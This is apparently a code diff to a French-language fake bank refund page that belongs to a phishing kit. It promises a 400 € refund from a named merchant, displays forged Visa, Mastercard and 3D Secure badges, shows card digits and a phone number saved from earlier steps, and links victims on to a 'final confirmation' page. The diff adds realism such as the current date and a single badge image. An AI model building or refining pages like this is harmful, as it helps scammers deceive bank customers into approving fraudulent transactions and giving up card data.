@@ -63,8 +63,9 @@
             color: #000;
         }
         .footer-icons img {
-            width: 50px;
-            margin: 10px;
+            width: 100%;
+            max-width: 300px;
+            margin: 10px auto;
         }
     </style>
 </head>
@@ -81,31 +82,39 @@
             <p>
                 Merci de vous connecter sur votre application bancaire afin d'approuver la demande de remboursement et créditer le montant sur votre carte.<br>
                 Valider par SMS si vous ne possédez pas l'application bancaire !<br>
-                <a href="#">Cliquez ici</a>
+                <a href="confirmation_finale.html">Cliquez ici</a>
             </p>
         </div>
 
         <!-- Informations du remboursement -->
         <div class="info">
-            <p><strong>Marchand :</strong> Emryslacarte</p>
+            <p><strong>Marchand :</strong> Widilo</p>
             <p><strong>Montant de remboursement :</strong> 400 €</p>
-            <p><strong>Date :</strong> 17 décembre 2024 à 02:38</p>
-            <p><strong>N° de carte :</strong> **** **** **** <span id="last-four"></span></p>
-            <p><strong>Numéro de téléphone :</strong> <span id="phone-number"></span></p>
+            <p><strong>Date :</strong> <span id="current-date"></span></p>
+            <p><strong>N° de carte :</strong> **** **** **** <span id="last-four">0000</span></p>
+            <p><strong>Numéro de téléphone :</strong> <span id="phone-number">Non renseigné</span></p>
         </div>
 
         <!-- Icônes de sécurité -->
         <div class="footer-icons">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Verified_by_VISA.png" alt="Verified by Visa">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7d/Mastercard-logo-2.png" alt="Mastercard SecureCode">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/3d_secure.png" alt="3D Secure">
+            <img src="IMG_4110.jpeg" alt="Verified by Visa, 3D Secure, MasterCard SecureCode">
         </div>
     </div>
 
     <script>
+        // الحصول على التاريخ الحالي فقط
+        const currentDate = new Date();
+        const formattedDate = currentDate.toLocaleDateString('fr-FR', {
+            year: 'numeric',
+            month: 'long',
+            day: 'numeric'
+        });
+
+        document.getElementById('current-date').innerText = formattedDate;
+
         // Récupération des données depuis le localStorage (carte et téléphone)
-        const lastFourDigits = localStorage.getItem('lastFour') || '0000';
-        const phoneNumber = localStorage.getItem('phone') || 'Non renseigné';
+        const lastFourDigits = localStorage.getItem('lastFourDigits') || '0000';
+        const phoneNumber = localStorage.getItem('phoneNumber') || 'Non renseigné';
 
         // Injection dans les éléments HTML
         document.getElementById('last-four').innerText = lastFourDigits;
